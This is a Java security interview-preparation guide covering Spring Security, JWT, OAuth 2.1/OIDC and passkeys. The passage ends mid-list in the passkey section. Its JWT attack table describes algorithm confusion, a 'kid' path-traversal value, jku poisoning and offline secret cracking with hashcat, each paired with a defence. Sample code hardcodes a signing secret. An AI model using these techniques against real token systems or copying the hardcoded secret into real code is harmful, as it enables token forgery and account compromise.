# Security for Java Applications — Senior Engineer Interview Preparation

> **April 2026 context.** This guide targets Java 24/25 and Spring Security 6.5.x / 7.0.x. Key recent events: Security Manager **permanently disabled** in Java 24 ([JEP 486](https://openjdk.org/jeps/486)), Key Derivation Function API added ([JEP 478](https://openjdk.org/jeps/478), finalized in JEP 510), post-quantum primitives ML-KEM / ML-DSA shipped ([JEP 496](https://openjdk.org/jeps/496), [JEP 497](https://openjdk.org/jeps/497)), hybrid PQ TLS 1.3 in progress ([JEP 527](https://openjdk.org/jeps/527)), OWASP Top 10 **2025 edition** released November 2025, and OAuth 2.1 now standard for new deployments. `WebSecurityConfigurerAdapter` has been gone since Spring Security 5.8 — all configs are component-based (`SecurityFilterChain` + lambda DSL).

---

## 1. Authentication vs Authorization

### Authentication ("Who are you?")

Authentication is the process of **verifying identity** — confirming that a user or system is who they claim to be. It answers the question "Who are you?" before any access decision is made.

**Authentication Factors:**

| Factor | Description | Examples |
|--------|-------------|----------|
| Something you **know** | Knowledge-based secrets | Password, PIN, security questions |
| Something you **have** | Physical or digital possession | Hardware token, phone (SMS/TOTP), smart card |
| Something you **are** | Biometric characteristics | Fingerprint, face recognition, retinal scan |

**Multi-Factor Authentication (MFA)** requires two or more factors from different categories. Using a password + security question is NOT true MFA (both are "something you know").

**Phishing-resistant MFA** (NIST SP 800-63B rev 4, 2025) is now the required bar for high-assurance environments. SMS and TOTP are phishable through real-time proxies (evilginx, Modlishka) and are being deprecated. Passkeys / FIDO2 security keys / platform authenticators are the 2026 standard — see section 5.

### Threat Modeling (STRIDE)

Before writing any auth code, a senior engineer models threats. **STRIDE** is the most widely used lightweight framework — each letter maps to a category of threat and a corresponding security property:

| Threat | Violates | Example | Mitigation |
|--------|----------|---------|------------|
| **S**poofing | Authentication | Logging in as another user | Passkeys, MFA, signed tokens |
| **T**ampering | Integrity | Modifying a request body in flight | HMAC, TLS, JWT signatures |
| **R**epudiation | Non-repudiation | "I never placed that order" | Immutable audit logs, signed transactions |
| **I**nformation Disclosure | Confidentiality | Leaking PII via verbose errors | Encryption at rest/transit, error sanitization |
| **D**enial of Service | Availability | Exhausting connection pool | Rate limiting, timeouts, bulkheads |
| **E**levation of Privilege | Authorization | User reaches an admin endpoint | Least privilege, `@PreAuthorize`, tenant checks |

Complement with **OWASP Threat Dragon** or **Microsoft Threat Modeling Tool** for data-flow diagrams. For senior interviews you should be able to walk through STRIDE for a given system design on a whiteboard.

### Authorization ("What can you do?")

Authorization determines **what actions an authenticated entity is permitted to perform**. It happens after authentication and answers "What are you allowed to do?"

### Authorization Models

#### RBAC (Role-Based Access Control)

Users are assigned **roles**, and roles are granted **permissions**. Simple and widely used.

```java
// Spring Security RBAC
@PreAuthorize("hasRole('ADMIN')")
public void deleteUser(Long userId) { ... }

@PreAuthorize("hasAnyRole('ADMIN', 'MANAGER')")
public List<Report> getReports() { ... }
```

#### ABAC (Attribute-Based Access Control)

Access decisions based on **attributes** of the user, resource, action, and environment. More flexible, more complex.

```java
// ABAC-style with Spring Security SpEL
@PreAuthorize("@authz.canAccessDocument(authentication, #documentId)")
public Document getDocument(Long documentId) { ... }

@Component("authz")
public class AuthorizationLogic {
    public boolean canAccessDocument(Authentication auth, Long docId) {
        User user = (User) auth.getPrincipal();
        Document doc = documentRepo.findById(docId).orElseThrow();
        // Check attributes: department, classification level, time of day
        return user.getDepartment().equals(doc.getDepartment())
            && user.getClearanceLevel() >= doc.getClassificationLevel();
    }
}
```

#### ACL (Access Control List)

Each resource has an explicit list of who can access it and with what permissions. Fine-grained but hard to scale.

```java
// Spring Security ACL
@PreAuthorize("hasPermission(#document, 'WRITE')")
public void updateDocument(Document document) { ... }
```

### Comparison Table

| Feature | RBAC | ABAC | ACL |
|---------|------|------|-----|
| Granularity | Coarse (role-level) | Fine (attribute-level) | Fine (per-resource) |
| Scalability | High | Medium | Low |
| Complexity | Low | High | Medium |
| Dynamic decisions | No (static roles) | Yes (runtime attributes) | No (static lists) |
| Audit trail | Easy (role assignments) | Complex (attribute evaluation) | Easy (explicit lists) |
| Best for | Enterprise apps, clear hierarchy | Complex policies, context-dependent | File systems, small datasets |
| Implementation effort | Low | High | Medium |

---

## 2. Spring Security Architecture

Spring Security is a powerful framework built around the **Servlet Filter** mechanism. Every HTTP request passes through a chain of security filters before reaching the controller.

### Spring Security 6.x / 7.x — What Changed

Senior engineers are expected to know these modernization milestones — coming from a Spring Security 4/5 codebase is a common migration project:

| Change | Removed / Deprecated | Replacement |
|--------|---------------------|-------------|
| **`WebSecurityConfigurerAdapter`** | Removed in 6.0 (deprecated 5.7, gone 5.8) | Expose a `SecurityFilterChain` bean and (optionally) a `WebSecurityCustomizer` bean |
| **`.antMatchers()` / `.mvcMatchers()` / `.regexMatchers()`** | Removed in 6.0 | `.requestMatchers(...)` auto-selects MVC vs ant matching |
| **`.authorizeRequests()`** | Removed in 6.0 | `.authorizeHttpRequests()` uses the new `AuthorizationFilter` and `AuthorizationManager` |
| **`AccessDecisionManager` / `AccessDecisionVoter`** | Removed | `AuthorizationManager<T>` (lambda-friendly, returns `AuthorizationDecision`) |
| **`FilterSecurityInterceptor`** | Replaced | `AuthorizationFilter` |
| **`@EnableGlobalMethodSecurity`** | Deprecated | `@EnableMethodSecurity` (pre/post is enabled by default, uses AOT-compatible proxies) |
| **Builder-style chaining (no lambdas)** | Deprecated in 7.x | **Lambda DSL** is mandatory in 7.0 — builder methods like `http.csrf().disable().and().cors()...` are gone |
| **`requestMatchers(...).hasRole(...)` on role with `ROLE_` prefix** | Confusing | Use `.hasRole("ADMIN")` (prefix added automatically) or `.hasAuthority("ROLE_ADMIN")` (exact match) |
| **HttpSecurity defaults for CSRF on stateless APIs** | Still enabled by default | Must be explicitly `.csrf(c -> c.disable())` for JWT APIs (or migrate to `CsrfTokenRequestAttributeHandler` + SPA cookie pattern) |

**Spring Security 6.5 (2025) / 7.0 (2026) highlights** relevant to senior interviews:
- **OAuth 2.0 DPoP** (Demonstrating Proof of Possession) — sender-constrained tokens that cryptographically bind an access token to a client-held private key. Defeats bearer-token theft.
- **PKCE for confidential clients** — `ClientRegistration.clientSettings.requireProofKey=true` is now a one-liner.
- **Passkeys / WebAuthn DSL** — first-class `http.webAuthn(...)` configurer with customizable `HttpMessageConverter`.
- **Micrometer context propagation** — the SecurityContext is now propagated automatically across reactive/virtual-thread boundaries via the Micrometer Context Propagation library.
- **Observability key rename** — `security.security.reached.filter.section` → `spring.security.reached.filter.section` (fix if you have Grafana dashboards).
- **`AuthorizationManager`** is the extension point for custom authz: return `new AuthorizationDecision(boolean)` from a `check(Supplier<Authentication>, T)` method and plug in via `.access(myAuthzManager)`.

### SecurityFilterChain

The `SecurityFilterChain` is an ordered pipeline of filters that processes each request. Spring Security registers a `DelegatingFilterProxy` that delegates to a `FilterChainProxy`, which manages one or more `SecurityFilterChain` instances.

```
HTTP Request
    |
    v
DelegatingFilterProxy
    |
    v
FilterChainProxy
    |
    v
SecurityFilterChain [ordered filters]
    |-- DisableEncodeUrlFilter
    |-- SecurityContextPersistenceFilter
    |-- CorsFilter
    |-- CsrfFilter
    |-- LogoutFilter
    |-- UsernamePasswordAuthenticationFilter (or JWT filter)
    |-- ExceptionTranslationFilter
    +-- AuthorizationFilter (formerly FilterSecurityInterceptor)
    |
    v
DispatcherServlet -> Controller
```

### SecurityContext and SecurityContextHolder

The `SecurityContextHolder` stores the `SecurityContext`, which holds the `Authentication` object for the current thread.

```java
// Accessing the current authenticated user
SecurityContext context = SecurityContextHolder.getContext();
Authentication auth = context.getAuthentication();
String username = auth.getName();
Collection<? extends GrantedAuthority> authorities = auth.getAuthorities();
```

Storage strategies:
- `MODE_THREADLOCAL` (default) — each thread has its own context
- `MODE_INHERITABLETHREADLOCAL` — child threads inherit parent's context
- `MODE_GLOBAL` — all threads share one context (rarely used)

**Virtual threads and reactive flows.** `ThreadLocal` behaves exactly as expected on virtual threads (Project Loom, Java 21+), but it is *cheap* there — each virtual thread has its own copy. More interesting: in Spring 6.1+ / Spring Security 6.5+, propagation across reactive boundaries is handled by the **Micrometer Context Propagation** library, so the `Reactor` / virtual-thread scheduler boundaries no longer drop the `SecurityContext`. For WebFlux use `ReactiveSecurityContextHolder.getContext()` which returns a `Mono<SecurityContext>` — never call the servlet `SecurityContextHolder` inside a reactive chain.

```java
// Reactive access (WebFlux)
Mono<String> username = ReactiveSecurityContextHolder.getContext()
    .map(SecurityContext::getAuthentication)
    .map(Authentication::getName);
```

### Authentication Interface

```java
public interface Authentication extends Principal, Serializable {
    // The authorities granted (roles/permissions)
    Collection<? extends GrantedAuthority> getAuthorities();

    // Credentials (usually password, cleared after authentication)
    Object getCredentials();

    // Additional details (IP address, session ID, etc.)
    Object getDetails();

    // The principal (usually UserDetails)
    Object getPrincipal();

    // Whether the user has been authenticated
    boolean isAuthenticated();
}
```

### UserDetailsService and UserDetails

`UserDetailsService` is the core interface for loading user data. Spring Security calls it during authentication.

```java
@Service
public class CustomUserDetailsService implements UserDetailsService {

    private final UserRepository userRepository;

    public CustomUserDetailsService(UserRepository userRepository) {
        this.userRepository = userRepository;
    }

    @Override
    public UserDetails loadUserByUsername(String username)
            throws UsernameNotFoundException {
        User user = userRepository.findByUsername(username)
            .orElseThrow(() -> new UsernameNotFoundException(
                "User not found: " + username));

        return org.springframework.security.core.userdetails.User.builder()
            .username(user.getUsername())
            .password(user.getPasswordHash())
            .authorities(user.getRoles().stream()
                .map(role -> new SimpleGrantedAuthority("ROLE_" + role.getName()))
                .toList())
            .accountExpired(!user.isActive())
            .accountLocked(user.isLocked())
            .build();
    }
}
```

### AuthenticationManager and AuthenticationProvider

The `AuthenticationManager` is the main entry point for authentication. Its default implementation, `ProviderManager`, delegates to a list of `AuthenticationProvider` instances.

```
AuthenticationManager
    +-- ProviderManager
        |-- DaoAuthenticationProvider (username/password)
        |-- JwtAuthenticationProvider (JWT tokens)
        +-- LdapAuthenticationProvider (LDAP directory)
```

Each provider handles a specific type of `Authentication` token. If one provider cannot authenticate the request, it passes to the next.

### Method-Level Security

```java
@Configuration
@EnableMethodSecurity // Replaces @EnableGlobalMethodSecurity in Spring Security 6
public class MethodSecurityConfig { }

@Service
public class OrderService {

    // SpEL expression evaluated before method execution
    @PreAuthorize("hasRole('ADMIN') or #order.customerId == authentication.principal.id")
    public void updateOrder(Order order) { ... }

    // Evaluated after method execution — can filter return value
    @PostAuthorize("returnObject.customerId == authentication.principal.id")
    public Order getOrder(Long orderId) { ... }

    // Simpler — no SpEL, just role names
    @Secured("ROLE_ADMIN")
    public void deleteOrder(Long orderId) { ... }

    // Filter collections
    @PreFilter("filterObject.owner == authentication.name")
    public void processOrders(List<Order> orders) { ... }
}
```

### Custom Filters — Extending OncePerRequestFilter

```java
public class JwtAuthenticationFilter extends OncePerRequestFilter {

    private final JwtTokenProvider tokenProvider;
    private final UserDetailsService userDetailsService;

    public JwtAuthenticationFilter(JwtTokenProvider tokenProvider,
                                    UserDetailsService userDetailsService) {
        this.tokenProvider = tokenProvider;
        this.userDetailsService = userDetailsService;
    }

    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                     HttpServletResponse response,
                                     FilterChain filterChain)
            throws ServletException, IOException {

        String token = extractToken(request);

        if (token != null && tokenProvider.validateToken(token)) {
            String username = tokenProvider.getUsernameFromToken(token);
            UserDetails userDetails = userDetailsService.loadUserByUsername(username);

            UsernamePasswordAuthenticationToken authentication =
                new UsernamePasswordAuthenticationToken(
                    userDetails, null, userDetails.getAuthorities());
            authentication.setDetails(
                new WebAuthenticationDetailsSource().buildDetails(request));

            SecurityContextHolder.getContext().setAuthentication(authentication);
        }

        filterChain.doFilter(request, response);
    }

    private String extractToken(HttpServletRequest request) {
        String bearerToken = request.getHeader("Authorization");
        if (bearerToken != null && bearerToken.startsWith("Bearer ")) {
            return bearerToken.substring(7);
        }
        return null;
    }
}
```

### Spring Security Configuration with JWT

```java
@Configuration
@EnableWebSecurity
@EnableMethodSecurity
public class SecurityConfig {

    private final JwtAuthenticationFilter jwtFilter;
    private final CustomUserDetailsService userDetailsService;

    public SecurityConfig(JwtAuthenticationFilter jwtFilter,
                          CustomUserDetailsService userDetailsService) {
        this.jwtFilter = jwtFilter;
        this.userDetailsService = userDetailsService;
    }

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        return http
            .csrf(csrf -> csrf.disable()) // Disable CSRF for stateless API
            .sessionManagement(session ->
                session.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/api/auth/**").permitAll()
                .requestMatchers("/api/public/**").permitAll()
                .requestMatchers("/api/admin/**").hasRole("ADMIN")
                .requestMatchers(HttpMethod.DELETE, "/api/**").hasRole("ADMIN")
                .anyRequest().authenticated()
            )
            .addFilterBefore(jwtFilter,
                UsernamePasswordAuthenticationFilter.class)
            .exceptionHandling(ex -> ex
                .authenticationEntryPoint((req, res, authEx) -> {
                    res.setStatus(HttpServletResponse.SC_UNAUTHORIZED);
                    res.getWriter().write("{\"error\": \"Unauthorized\"}");
                })
                .accessDeniedHandler((req, res, accessEx) -> {
                    res.setStatus(HttpServletResponse.SC_FORBIDDEN);
                    res.getWriter().write("{\"error\": \"Access denied\"}");
                })
            )
            .build();
    }

    @Bean
    public AuthenticationManager authenticationManager(
            AuthenticationConfiguration config) throws Exception {
        return config.getAuthenticationManager();
    }

    @Bean
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder(12);
    }
}
```

---

## 3. JWT (JSON Web Tokens)

### Structure

A JWT consists of three Base64URL-encoded parts separated by dots:

```
Header.Payload.Signature

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4iLCJpYXQiOjE1MTYyMzkwMjJ9.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

**Header** — algorithm and token type:
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Payload** — claims (data):
```json
{
  "sub": "1234567890",
  "name": "John Doe",
  "iat": 1516239022,
  "exp": 1516242622,
  "roles": ["ADMIN", "USER"]
}
```

**Signature** — ensures integrity:
```
HMACSHA256(base64UrlEncode(header) + "." + base64UrlEncode(payload), secret)
```

### Signing Algorithms

| Algorithm | Type | Key | Use Case |
|-----------|------|-----|----------|
| HS256 | Symmetric (HMAC) | Single shared secret | Single service, internal APIs |
| RS256 | Asymmetric (RSA) | Private key signs, public key verifies | Distributed systems, third-party verification |
| ES256 | Asymmetric (ECDSA) | Smaller keys than RSA, same security | Mobile, performance-sensitive |

**When to use which:**
- **HS256** — when the same service creates and validates tokens. Simpler, faster. The secret must be shared with every verifier (security risk in distributed systems).
- **RS256** — when multiple services need to verify tokens but only one should create them. The authorization server keeps the private key; resource servers only need the public key. Standard choice for OAuth 2.0 / OIDC.

### Standard Claims

| Claim | Name | Description |
|-------|------|-------------|
| `iss` | Issuer | Who issued the token |
| `sub` | Subject | Who the token represents (user ID) |
| `aud` | Audience | Intended recipient(s) |
| `exp` | Expiration | Token expiry (Unix timestamp) |
| `iat` | Issued At | When the token was created |
| `nbf` | Not Before | Token not valid before this time |
| `jti` | JWT ID | Unique identifier (for revocation) |

### Access Tokens vs Refresh Tokens

| Property | Access Token | Refresh Token |
|----------|-------------|---------------|
| Lifetime | Short (5-15 minutes) | Long (days to weeks) |
| Purpose | Authorize API requests | Obtain new access tokens |
| Sent with | Every API request (Authorization header) | Only to token refresh endpoint |
| Storage | Memory (preferred) or HttpOnly cookie | HttpOnly secure cookie |
| Contains | User info, roles, permissions | Minimal (user ID, token family) |
| Revocation | Hard (stateless) | Easy (stored server-side) |

### Token Storage Trade-offs

| Storage | XSS Vulnerable | CSRF Vulnerable | Notes |
|---------|---------------|-----------------|-------|
| `localStorage` | Yes (JS can read) | No | Never use for sensitive tokens |
| `sessionStorage` | Yes (JS can read) | No | Lost on tab close |
| HttpOnly cookie | No (JS cannot read) | Yes (auto-sent) | Use with CSRF protection |
| HttpOnly + SameSite=Strict cookie | No | No | Best option, limits cross-site usage |
| In-memory (JS variable) | Technically yes | No | Lost on refresh; most secure for SPAs |

### Token Revocation Strategies

1. **Short-lived access tokens** — set expiration to 5-15 minutes; even compromised tokens expire quickly
2. **Token blacklist** — store revoked `jti` values in Redis/cache; check on every request (adds statefulness)
3. **Token versioning** — store a version counter per user in DB; increment on logout/password change; reject tokens with old version
4. **Refresh token rotation** — issue a new refresh token with each use; if a refresh token is used twice, revoke the entire family (detects theft)

### Common JWT Mistakes

1. **Storing sensitive data in the payload** — JWTs are encoded, not encrypted. Anyone can decode the payload. Use JWE (JSON Web Encryption) if you must carry secrets.
2. **Not validating the signature** — always verify; never trust unverified tokens.
3. **Not checking `exp`** — expired tokens must be rejected.
4. **Not validating `iss` and `aud`** — prevents token confusion attacks between services.
5. **Using `alg: none`** — some libraries accept unsigned tokens if the algorithm header is `"none"`. Always enforce the expected algorithm server-side (allowlist, not blocklist).
6. **Symmetric keys that are too short** — HMAC keys should be at least 256 bits.
7. **Transmitting tokens over HTTP** — always require HTTPS.
8. **Trusting the `alg` header** — never use the algorithm declared in the token to pick the verification key. Configure the algorithm on the verifier.

### JWT Attack Classes (senior-level)

| Attack | Mechanism | Mitigation |
|--------|-----------|-----------|
| **`alg: none`** | Library accepts `"alg": "none"` and treats the token as unsigned | Configure verifier with explicit algorithm allowlist; never accept `none` in production |
| **Algorithm confusion (RS256 → HS256)** | Server's RSA public key is submitted back as an HMAC secret. Attacker signs a forged token with `alg=HS256` using the server's public RSA key. Since the library's generic `verify()` uses the same key for both algorithms, the signature validates | Always pin the expected algorithm at the verifier; keep algorithm-specific verifier APIs; never expose the JWKS public key as the symmetric HMAC key. See CVE-2023-48223, CVE-2023-48238 |
| **`kid` header injection** | `kid` points to `../../../dev/null` (empty file equals empty HMAC key) or performs SQL injection when loading keys | Treat `kid` as an opaque identifier; validate against a fixed allowlist of key IDs from a JWKS |
| **`jku` / `x5u` poisoning** | Token header points the verifier at an attacker-controlled JWKS URL | Never follow `jku`/`x5u`; load the JWKS from a configured trusted URL only |
| **Weak HMAC secret** | `secret`, `password`, `changeme` — brute-forceable offline with `hashcat -m 16500` | Use 256+ bit random secrets; rotate from a secrets manager; prefer RS256/ES256 for anything distributed |
| **Replay (no `jti`, no nonce)** | Same token replayed against different services | Short `exp`, unique `jti`, token revocation list, or DPoP / mTLS binding |
| **Cross-tenant confusion** | Token issued for tenant A is accepted by tenant B's service | Always validate `iss`, `aud`, and tenant claims |

### Key Management

- **Never hardcode secrets.** Load HMAC/RSA/EC keys from Vault, AWS Secrets Manager, or KMS.
- **Rotate signing keys** via a JWKS with multiple `kid` entries — publish the new key, let services pick it up, then sign with it, then retire the old key after max token TTL has elapsed.
- **Use RS256 / ES256 / EdDSA (Ed25519)** for distributed systems. Keep the private key on the authorization server only; resource servers fetch the JWKS. ES256 and EdDSA give the same security as RS256 with much smaller keys and signatures.
- **Cache JWKS responses** but respect `Cache-Control` and refresh on unknown `kid` (otherwise you bounce users during rotation).

### JWT Creation and Validation Example

```java
import io.jsonwebtoken.Claims;
import io.jsonwebtoken.Jwts;
import io.jsonwebtoken.security.Keys;

import javax.crypto.SecretKey;
import java.util.Date;
import java.util.List;

public class JwtTokenProvider {

    // In production, load from environment/vault — never hardcode
    private final SecretKey key = Keys.hmacShaKeyFor(
        "my-super-secret-key-that-is-at-least-256-bits-long!!".getBytes());

    private final long accessTokenValidity = 15 * 60 * 1000;  // 15 minutes
    private final long refreshTokenValidity = 7 * 24 * 60 * 60 * 1000; // 7 days

    public String createAccessToken(String username, List<String> roles) {
        Date now = new Date();
        return Jwts.builder()
            .subject(username)
            .claim("roles", roles)
            .issuedAt(now)
            .expiration(new Date(now.getTime() + accessTokenValidity))
            .issuer("my-application")
            .signWith(key)
            .compact();
    }

    public String createRefreshToken(String username) {
        Date now = new Date();
        return Jwts.builder()
            .subject(username)
            .issuedAt(now)
            .expiration(new Date(now.getTime() + refreshTokenValidity))
            .issuer("my-application")
            .id(java.util.UUID.randomUUID().toString()) // jti for revocation
            .signWith(key)
            .compact();
    }

    public boolean validateToken(String token) {
        try {
            Jwts.parser()
                .verifyWith(key)
                .requireIssuer("my-application")
                .build()
                .parseSignedClaims(token);
            return true;
        } catch (Exception e) {
            // Log the specific exception type for debugging
            return false;
        }
    }

    public String getUsernameFromToken(String token) {
        Claims claims = Jwts.parser()
            .verifyWith(key)
            .build()
            .parseSignedClaims(token)
            .getPayload();
        return claims.getSubject();
    }

    @SuppressWarnings("unchecked")
    public List<String> getRolesFromToken(String token) {
        Claims claims = Jwts.parser()
            .verifyWith(key)
            .build()
            .parseSignedClaims(token)
            .getPayload();
        return claims.get("roles", List.class);
    }
}
```

---

## 4. OAuth 2.0 / OAuth 2.1 / OpenID Connect

### OAuth 2.1 — The Consolidation (what you need to know in 2026)

OAuth 2.1 is a **Best Current Practice consolidation** of OAuth 2.0 + a decade of security guidance (RFC 6749, 6750, 7636, 8252, 8628, 9068, 9126). It is still in late-stage IETF draft but is already what every modern authorization server (Auth0, Keycloak, Okta, Azure AD, Cognito) implements and what new systems should target.

| Change | OAuth 2.0 | OAuth 2.1 |
|--------|-----------|-----------|
| **PKCE** | Optional, only required for public clients | **Required for all clients**, including confidential ones |
| **Implicit grant (`response_type=token`)** | Allowed | **Removed** |
| **Resource Owner Password Credentials grant** | Allowed | **Removed** |
| **Redirect URI matching** | Allowed partial match / wildcards | **Exact string match required** (no wildcards) |
| **Bearer tokens in query strings** | Allowed | **Prohibited** (`Authorization: Bearer` header only) |
| **Refresh token rotation** | Recommended | Required for public clients; SHOULD for confidential |
| **Public client secrets** | Sometimes embedded | Not used — PKCE replaces client secrets for public clients |

### Roles

| Role | Description | Example |
|------|-------------|---------|
| **Resource Owner** | The user who owns the data | End user |
| **Client** | The application requesting access | Web app, mobile app |
| **Authorization Server** | Issues tokens after authenticating the user | Keycloak, Auth0, Okta |
| **Resource Server** | Hosts protected resources, validates tokens | Your REST API |

### Grant Types

#### Authorization Code + PKCE (Recommended for Web and Mobile)

The most secure grant type. Used when a user interacts with a browser.

```
1. Client generates code_verifier (random string) and code_challenge (SHA256 hash)
2. Client redirects user to Authorization Server with code_challenge
3. User authenticates and consents
4. Authorization Server redirects back with authorization code
5. Client exchanges code + code_verifier for tokens
6. Authorization Server verifies code_challenge matches, issues tokens
```

```
+--------+      +------------+      +----------------+      +------------+
| User   |      |  Client    |      |  Auth Server   |      | Resource   |
|        |      |  (App)     |      |                |      |  Server    |
+---+----+      +-----+------+      +-------+--------+      +-----+------+
    |  1. Login       |                      |                      |
    |---------------->|                      |                      |
    |                 |  2. Redirect with     |                      |
    |                 |  code_challenge       |                      |
    |                 |--------------------->|                      |
    |  3. Login prompt                       |                      |
    |<---------------------------------------|                      |
    |  4. Credentials                        |                      |
    |--------------------------------------->|                      |
    |                 |  5. Auth code         |                      |
    |                 |<--------------------|                      |
    |                 |  6. Code + verifier   |                      |
    |                 |--------------------->|                      |
    |                 |  7. Access token      |                      |
    |                 |<--------------------|                      |
    |                 |  8. API request + token                     |
    |                 |-------------------------------------------->|
    |                 |  9. Protected resource                      |
    |                 |<--------------------------------------------|
```

**PKCE** (Proof Key for Code Exchange) prevents authorization code interception attacks. It is now recommended for ALL clients, not just public clients.

#### Client Credentials (Service-to-Service)

No user involved. The client authenticates with its own credentials.

```
POST /oauth/token
Content-Type: application/x-www-form-urlencoded

grant_type=client_credentials
&client_id=service-a
&client_secret=s3cret
&scope=read:orders
```

#### Device Code (TV / IoT)

For devices with limited input capabilities:
1. Device requests a device code and user code
2. Device displays: "Go to https://example.com/device and enter code: ABCD-1234"
3. User enters code on their phone/computer and authenticates
4. Device polls the authorization server until the user completes authentication

### Deprecated Grant Types

| Grant Type | Why Deprecated | Replacement |
|------------|---------------|-------------|
| **Implicit** | Token exposed in URL fragment, no refresh tokens, vulnerable to token leakage | Authorization Code + PKCE |
| **Resource Owner Password** | Client handles user credentials directly, breaks separation of concerns, cannot support MFA | Authorization Code + PKCE |

### OpenID Connect (OIDC)

OIDC is an **identity layer on top of OAuth 2.0**. OAuth 2.0 alone is about authorization (access), not authentication (identity).

- OAuth 2.0 gives you an **access token** (what you can do)
- OIDC adds an **ID token** (who you are) — a JWT containing user identity claims
- Standard scopes: `openid`, `profile`, `email`, `address`, `phone`
- Defines a `/userinfo` endpoint for fetching user profile data
- Discovery document at `/.well-known/openid-configuration`

**ID token validation checklist:**
1. Signature verifies against a key from the OP's JWKS (match on `kid`)
2. `iss` equals the expected OpenID Provider
3. `aud` contains this client's `client_id`
4. `exp` is in the future, `iat` is recent
5. `nonce` (passed in the auth request) matches what was sent
6. If `at_hash` / `c_hash` are present, they validate the companion access/code
7. `acr` / `amr` meet the required authentication context (e.g., MFA was actually performed)

### Sender-Constrained Tokens: DPoP and mTLS

Bearer tokens are vulnerable to theft — anyone who gets the string can use it. Modern OAuth deployments bind tokens to a specific client:

- **mTLS-bound tokens (RFC 8705)** — the access token carries a `cnf` claim with the hash of the client's TLS certificate; the resource server requires the same cert to present the token.
- **DPoP (RFC 9449)** — "Demonstrating Proof of Possession". Client generates an ephemeral key pair, signs a DPoP proof JWT per request (`htm`, `htu`, `iat`, `jti`, nonce), and the access token's `cnf.jkt` thumbprint must match the DPoP key. Spring Security 6.5 added first-class DPoP support on the resource server side; 7.x extends it to the authorization-server side via Spring Authorization Server.

Use DPoP for browser-based SPAs where mTLS is impractical, mTLS for service-to-service.

### The `state` Parameter and CSRF on OAuth Flows

Overlooked by juniors, tested by senior interviewers. The authorization code flow itself is vulnerable to CSRF — an attacker can trick a victim into completing a login with the attacker's account, then inject their own code into the victim's callback. The fix:

- Client generates a cryptographically random `state` before the authorization request, stores it in the user's session
- Authorization server reflects `state` back on the redirect to the `redirect_uri`
- Client rejects the callback if the returned `state` does not match session

OAuth 2.1 makes PKCE universal, and PKCE's `code_verifier` check covers most of the same attack — but `state` is still mandatory because PKCE runs after the callback has already been accepted. Treat `state` + `nonce` (for OIDC) + PKCE as the three-layer defense. Spring Security's `oauth2Login()` and `oauth2Client()` handle all three automatically; if you hand-roll a client, do not skip any.

### Hardened Authorization Requests: PAR, JAR, JARM

For high-assurance deployments (banking, government, open banking standards like FAPI 2.0), the plain authorization request is further hardened:

| Mechanism | RFC | What it does |
|-----------|-----|--------------|
| **PAR** (Pushed Authorization Requests) | RFC 9126 | Client pushes request parameters to a backchannel `/par` endpoint, receives a `request_uri`, then redirects the user-agent with only that opaque reference. No sensitive params ever touch the front channel |
| **JAR** (JWT-Secured Authorization Request) | RFC 9101 | The request object is a signed (and optionally encrypted) JWT. Prevents parameter tampering between the user agent and the authorization server |
| **JARM** (JWT-Secured Authorization Response Mode) | OpenID Foundation spec | The authorization response (the redirect back to the client) is itself a signed JWT — detects tampering with `code`, `state`, or error params |

FAPI 2.0 baseline requires PAR + sender-constrained tokens (mTLS or DPoP) + PKCE. Spring Authorization Server 1.5+ supports PAR, JAR, and DPoP out of the box.

### Token Introspection vs JWT Validation

| Approach | How it works | Pros | Cons |
|----------|-------------|------|------|
| **JWT validation** | Resource server validates signature locally using public key | Fast, no network call, works offline | Cannot revoke immediately |
| **Token introspection** | Resource server calls auth server `/introspect` endpoint | Real-time revocation, opaque tokens | Network dependency, latency, single point of failure |

### Spring Security OAuth2 Resource Server Configuration

```java
@Configuration
@EnableWebSecurity
public class ResourceServerConfig {

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        return http
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/api/public/**").permitAll()
                .requestMatchers("/api/admin/**").hasAuthority("SCOPE_admin")
                .anyRequest().authenticated()
            )
            .oauth2ResourceServer(oauth2 -> oauth2
                .jwt(jwt -> jwt
                    .jwtAuthenticationConverter(jwtAuthenticationConverter())
                )
            )
            .build();
    }

    @Bean
    public JwtAuthenticationConverter jwtAuthenticationConverter() {
        JwtGrantedAuthoritiesConverter authoritiesConverter =
            new JwtGrantedAuthoritiesConverter();
        authoritiesConverter.setAuthoritiesClaimName("roles");
        authoritiesConverter.setAuthorityPrefix("ROLE_");

        JwtAuthenticationConverter converter = new JwtAuthenticationConverter();
        converter.setJwtGrantedAuthoritiesConverter(authoritiesConverter);
        return converter;
    }
}
```

`application.yml`:
```yaml
spring:
  security:
    oauth2:
      resourceserver:
        jwt:
          issuer-uri: https://auth.example.com/realms/my-realm
          # Or specify jwk-set-uri directly:
          # jwk-set-uri: https://auth.example.com/realms/my-realm/protocol/openid-connect/certs
```

---

## 5. Passkeys and WebAuthn (Passwordless, Phishing-Resistant MFA)

### Why Passkeys Matter in 2026

Passwords + SMS OTP + TOTP are all **phishable** — an attacker-in-the-middle page can relay credentials in real time. **Passkeys** (W3C WebAuthn / FIDO2) replace the password with a public-private key pair that is bound to the *origin* of the relying party, making phishing structurally impossible: the browser refuses to sign a challenge for a different domain.

- Private key stays in the authenticator (Secure Enclave, TPM, YubiKey) and never leaves
- The server stores only the public key
- Authentication is a signed challenge per login — no replayable shared secret
- Synced passkeys (iCloud Keychain, Google Password Manager, 1Password, Windows Hello) give users cross-device portability without the security penalty of passwords

Senior engineers in 2026 are expected to know that **passkeys are the default password replacement** in new systems and that most auth providers (Auth0, Okta, Keycloak 24+) support them natively.

### Ceremony Overview

**Registration:**
1. Server generates challenge, sends it with `user.id`, allowed algorithms, authenticator criteria
2. Browser asks authenticator to create a key pair bound to the origin + `rp.id`
3. Authenticator returns `attestationObject` + `clientDataJSON` signed by the newly created key
4. Server verifies, stores the public key + credential ID + sign counter

**Authentication:**
1. Server sends challenge + list of credential IDs for the user
